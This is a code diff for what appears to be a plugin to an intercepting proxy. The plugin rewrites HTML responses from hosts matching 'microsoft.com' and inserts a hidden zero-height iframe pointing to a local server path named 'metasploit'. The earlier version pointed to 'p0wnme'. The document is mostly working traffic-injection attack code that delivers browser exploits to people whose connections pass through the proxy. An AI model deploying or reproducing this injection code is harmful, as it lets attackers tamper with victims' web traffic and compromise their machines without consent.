@@ -4,15 +4,17 @@ from BeautifulSoup import BeautifulSoup
 import support.header as header
 
 ### CHANGE AS NEEDED
-url = 'http://www.google.com'
-match = (("Content-type","TEXT/HTML"),)
-code1 = '''<iframe height=0 src="http://localhost:8000/p0wnme"></iframe>'''
+request_match = (("Host","microsoft.com"),)
+response_match = (("Content-type","TEXT/HTML"),)
+code1 = '''<iframe height=0 src="http://localhost:8000/metasploit"></iframe>'''
 
 
 
 ### FUNCTION TO MANIPULATE CLIENT REQUEST
 def doRequest(session, request_header, data):
-  return(request_header, data, 0, 0)
+  changed = 0
+  stop = 0
+  return(request_header, data, changed, stop)
 
 
 
@@ -22,7 +24,7 @@ def doResponse(session, request_header, response_header, data):
   stop = 0
 
   ### DETERMINE IF WE NEED TO CHANGE DATA
-  if header.headertest(response_header):
+  if header.headertest(request_header, request_match) & header.headertest(response_header, response_match):
 
     ### MANIPULATE DATA - INSERT SCRIPT
     soup = BeautifulSoup(data)
@@ -35,15 +37,3 @@ def doResponse(session, request_header, response_header, data):
   header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')
   return(response_header, data, changed, stop)
 
-
-
-#### MAIN PROGRAM - TO DELETE UPON INTEGRATION
-#response = urllib2.urlopen(url)
-#data = response.read()
-#h = str(response.info()).splitlines(1)
-#response_header = [ ("Request",response.geturl()) ]
-#for x in h:
-  #response_header.append(tuple(x.split(": ", 1)))
-
-#(response_header, data, changed, stop) = doResponse(0, 0, response_header, data)
-#print data
